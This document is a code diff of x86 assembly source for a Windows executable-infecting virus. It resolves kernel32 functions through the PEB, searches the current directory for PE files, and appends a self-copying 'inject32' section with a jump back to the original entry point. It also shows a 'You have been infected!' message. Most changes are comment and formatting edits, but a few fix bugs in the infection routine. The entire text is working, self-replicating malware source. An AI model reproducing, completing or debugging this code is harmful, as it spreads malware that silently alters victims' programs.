@@ -24,7 +24,7 @@ inject32 SEGMENT read write execute
 	strCaption db 'Notice', 0
     strContent db 'You have been infected!', 0
     
-    ishName db 'inject32'        ; MUST be 8 bytes in length (pad 0 if not) + MUST match segment name
+    ishName db 'inject32' ; MUST be 8 bytes in length (pad 0 if not) + MUST match segment name
     ishVirtualSize dd 0
     ishVirtualAddress dd 0
     ishSizeOfRawData dd 0
@@ -33,13 +33,14 @@ inject32 SEGMENT read write execute
     ishPointerToLineNumbers dd 0
     ishNumberOfRelocations dw 0
     ishNumberOfLinenumbers dw 0
-    ishCharacteristics dd 0E0000040h    ; IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
-	                                    ; 0x00000040 | 0x20000000 | 0x40000000 | 0x80000000
+    ishCharacteristics dd 0E0000040h
+    ; IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE
+	; 0x00000040 | 0x20000000 | 0x40000000 | 0x80000000
     
     ; .data?
     tempDword dd 0
     tempDword2 dd 0
-    temp320B db 320 DUP(0)          ; To store WIN32_FIND_DATAA
+    temp320B db 320 DUP(0) ; To store WIN32_FIND_DATAA and other data longer than 4 bytes
     
 ; .code
 delta:
@@ -57,8 +58,8 @@ start:
     ; Allocate space in the stack
     add esp, stackAddr(stack_reserved)
     
-    mov edx, fromStack(deltaAddr)             ; selfEntry + 1 + 4 (call delta is 5 bytes long)
-    sub edx, postDelta - entrySectionOffset   ; edx = selfEntry
+    mov edx, fromStack(deltaAddr) ; selfEntry + 1 + 4 (call delta is 5 bytes long)
+    sub edx, postDelta - entrySectionOffset ; edx = selfEntry
     toStack selfEntry, edx
     
     sub edx, entrySectionOffset
@@ -69,35 +70,33 @@ start:
     
     ; Find kernel32.dll
     ASSUME FS:NOTHING
-    mov ebx, fs:30h              ; PEB
-    mov ebx, [ebx + 0Ch]         ; PEB -> PEB_LDR_DATA
-    mov ebx, [ebx + 14h]         ; PEB -> PEB_LDR_DATA -> InMemoryOrderModuleList
-    mov ebx, [ebx] 
+    mov ebx, fs:30h
+    mov ebx, [ebx + 0Ch]
+    mov ebx, [ebx + 14h]
+    mov ebx, [ebx]
     mov ebx, [ebx]
     mov ebx, [ebx + 10h]
-	toStack kernel32dll, ebx     ; BaseAddress of kernel32.dll
+	toStack kernel32dll, ebx ; BaseAddress of kernel32.dll
     
-	; Get Export Table from kernel32.dll
     mov edi, [ebx + 3Ch]
     add edi, ebx
-    mov edi, [edi + 78h]         ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
+    mov edi, [edi + 78h] ; 24 (18h) + 96 (60h) = RVA of kernel32.dll Export Table
     add edi, ebx
     mov ecx, [edi + 24h]
     add ecx, ebx
-    toStack OrdinalTbl, ecx      ; VA of Ordinal Table
+    toStack OrdinalTbl, ecx ; VA of Ordinal Table
     
     mov esi, [edi + 20h]
     add esi, ebx
-    toStack NamePtrTbl, esi      ; VA of Name Pointer Table
+    toStack NamePtrTbl, esi ; VA of Name Pointer Table
     
     mov edx, [edi + 1Ch]
     add edx, ebx
-    toStack AddrTbl, edx         ; VA of Address Table
+    toStack AddrTbl, edx ; VA of Address Table
     
     mov edx, [edi + 14h]
     toStack k32NumFunc, edx
     
-	; Resolve functions through kernel32.dll and save to stack (position in stack already define in misc.inc)
     k32import strF1A
     toStack ffind1
     
@@ -128,7 +127,6 @@ start:
     k32import strLLA
     toStack loadlib
     
-	; Load user32.dll and get MessageBoxA
    	push daccess(offset stru32dll)
    	call vfromStack(loadlib)
     toStack user32dll
@@ -141,8 +139,7 @@ start:
     call vfromStack(getaddr)
     toStack msgbox
 	
-	; Check if new section "inject32" is already appear or not
-	; If not --> Save VirtualSize and PointerToRawData to stack
+	; 
 	mov ebx, fromStack(selfImageBaseAddress)
 	add ebx, 3Ch
 	mov ebx, DWORD PTR [ebx] ; ebx = e_lfanew
@@ -178,51 +175,50 @@ start:
 	mov eax, [esi + 20]
 	toStack selfPointerToRawData
     
-    ; Find PE file (*.exe) in directory to open and patch
+    ; Find first file in directory
     push daccess(offset temp320B)
     push daccess(offset strQuery)
     call vfromStack(ffind1)
     toStack fileHand
     
-	; Create file handle using CreateFileA( ... WIN32_FIND_DATAA.cFileName ... )
     openFile:
 			push 0
-			push 80h                                  ; FILE_ATTRIBUTE_NORMAL
-			push 4                                    ; OPEN_ALWAYS
+			push 80h ; FILE_ATTRIBUTE_NORMAL
+			push 4 ; OPEN_ALWAYS
 			push 0
-			push 1                                    ; FILE_SHARE_READ
-			push 40000000h OR 80000000h               ; GENERIC_READ | GENERIC_WRITE
+			push 1 or 2 or 4 ; FILE_SHARE_READ
+			push 40000000h OR 80000000h ; GENERIC_READ | GENERIC_WRITE
 				mov eax, daccess(offset temp320B)
 				add eax, 2Ch
-			push eax                                  ; cFileName in WIN32_FIND_DATAA
+			push eax ; cFileName in WIN32_FIND_DATAA
 		call vfromStack(fopen)
 		cmp eax, -1
 		je nextFile
 		toStack tgHand
 
 		; Obtain and verify magic bytes "MZ"
-		getval fromStack(tgHand), 2   
-		cmp tempDword, 5a4dh          ; Compare with "5a4dh"     
-		jne closeFile                 ; Not a PE file
+		getval fromStack(tgHand), 2
+		cmp paccess(tempDword), 5a4dh
+		jne closeFile ; Not a PE file
 
 		; e_lfanew
 		getval fromStack(tgHand), 4, SEEK_SET, 3Ch
 		mov eax, paccess(tempDword)
 		toStack lfanew
 
-		; Increase NumberOfSections (WORD at e_lfanew + 6)
+		; Obtain new NumberOfSections
 		mov ebx, fromStack(lfanew)
 		add ebx, 6
 		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack NumberOfSections
 
-		add ebx, 20 - 6                                 ; (WORD at e_lfanew + 20)
+		add ebx, 20 - 6 ; = lfanew + 20
 		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
 		toStack SizeOfOptionalHeader
 
-		add ebx, 4                                      ; (WORD at e_lfanew + 24 = ioh_offset)
+		add ebx, 4 ; = lfanew + 24 = ioh_offset
 		toStack ioh_offset, ebx
 		getval fromStack(tgHand), 2, SEEK_SET, ebx
 		mov eax, paccess(tempDword)
@@ -243,7 +239,7 @@ start:
 		getval fromStack(tgHand), 4
 		mov eax, paccess(tempDword)
 		toStack FileAlignment
-
+		
 		; Search for an already in-place injection
 		mov ebx, fromStack(ioh_offset)
 		add ebx, fromStack(SizeOfOptionalHeader) ; ebx = Section Table Offset
@@ -276,14 +272,13 @@ start:
 			cmp ebx, 0
 		ja already_injected_loop
 
-		; Calculate new section address
 		; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
 		mov ebx, fromStack(ioh_offset)
-		add ebx, fromStack(SizeOfOptionalHeader)
+		add ebx, fromStack(SizeOfOptionalHeader) ; ebx = Section Table Offset
 		mov edx, fromStack(NumberOfSections)
 		dec edx
 		imul edx, 40 ; Size of 1 section header
-		add ecx, edx
+		add ebx, edx
 		toStack lastish_offset, ebx
 
 		; Obtain lastish.VirtualAddress
@@ -311,10 +306,9 @@ start:
 		mov ebx, eax
 		inc eax
 		closest	eax, vfromStack(FileAlignment)
-		mov esi, eax                               ; Avoid eax being overwritten later (at daccess()/fwrite())
+		mov esi, eax ; Avoid eax being overwritten later (at daccess()/fwrite())
 		sub esi, ebx
 		mov paccess(tempDword), 0
-
 		pad1_loop:
 				push 0
 				push daccess(tempDword2)
@@ -324,7 +318,6 @@ start:
 			call vfromStack(fwrite)
 			dec esi
 			cmp esi, 0
-
 		ja pad1_loop
 			push SEEK_CUR
 			push 0
@@ -355,13 +348,13 @@ start:
 			push fromStack(tgHand)
 		call vfromStack(fwrite)
 			
-		; Final jmp instruction (jump back to OEP):
-		; E9 XX XX XX XX = jmp rel32 (5 bytes)
+		; Final jmp instruction:
+		; E9 XX XX XX XX = jmp disp32 (5 bytes)
 		mov paccess(tempDword), 0E9h
 			push 0
 			push daccess(tempDword2)
 			push 1
-			push daccess(tempDword)      ; jmp
+			push daccess(tempDword) ; jmp
 			push fromStack(tgHand)
 		call vfromStack(fwrite)
 		
@@ -370,12 +363,11 @@ start:
 			push 0
 			push 0
 			push fromStack(tgHand)
-		call vfromStack(fseek)                        ; Obtain current position
+		call vfromStack(fseek) ; Obtain current position
 		sub eax, paccess(ishPointerToRawData, ecx)
 		add eax, paccess(ishVirtualAddress, ecx)
-		add eax, 4                                    ; eax = RVA of end of this JMP instruction
-		sub ebx, eax                                  ; ebx = Difference between this JMP instruction and oldEntryPoint
-
+		add eax, 4 ; eax = RVA of end of this JMP instruction
+		sub ebx, eax ; ebx = Difference between this JMP instruction and oldEntryPoint
 		mov paccess(tempDword), ebx
 			push 0
 			push daccess(tempDword2)
@@ -384,7 +376,7 @@ start:
 			push fromStack(tgHand)
 		call vfromStack(fwrite)
 		
-		; Update VirtualSize & SizeOfRawData
+		; Register VirtualSize & SizeOfRawData
 			push SEEK_CUR
 			push 0
 			push 0
@@ -423,7 +415,7 @@ start:
 			push daccess(ishName, ecx)
 			push fromStack(tgHand)
 		call vfromStack(fwrite)
-
+		
 		; Increase NumberOfSections
 		mov ecx, vfromStack(NumberOfSections)
 		mov paccess(tempDword), ecx
@@ -491,7 +483,7 @@ start:
 		cmp eax, 0
     jne openFile
     
-    ; Check if there is no more file to write
+    ; No more file to write
     	push fromStack(fileHand)
     call vfromStack(ffind0)
     
@@ -511,7 +503,7 @@ inject32 ENDS
 .code
 exit:
     invoke ExitProcess, 0
-	xor eax, eax
-	ret
+;	xor eax, eax
+;	ret
 
 end start
